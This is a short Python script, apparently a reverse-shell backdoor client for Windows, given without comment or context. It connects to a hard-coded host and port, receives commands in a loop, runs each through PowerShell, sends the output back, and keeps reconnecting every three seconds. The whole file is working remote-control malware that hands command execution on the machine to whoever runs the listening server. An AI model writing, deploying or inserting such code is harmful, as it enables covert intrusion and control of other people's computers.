import socket 
import subprocess 
import time 

server_ip = "192.168.1.185"
server_port = 3001

server_addr  =(server_ip,server_port)

while True :
    try :
        client_socket = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
        client_socket.connect(server_addr) 
        server_command = client_socket.recv(1024)

        command = server_command.decode() 
        if command == "q":
            client_socket.close()
            break
        elif command == "":
            continue
        else :
            output = subprocess.run (["powershell.exe",command],shell =True,capture_output=True)
            if output.stderr.decode() == "":
                result = output.stdout 
            else : 
                result = output.stderr
            client_socket.send(result)

    except Exception :
        time.sleep(3)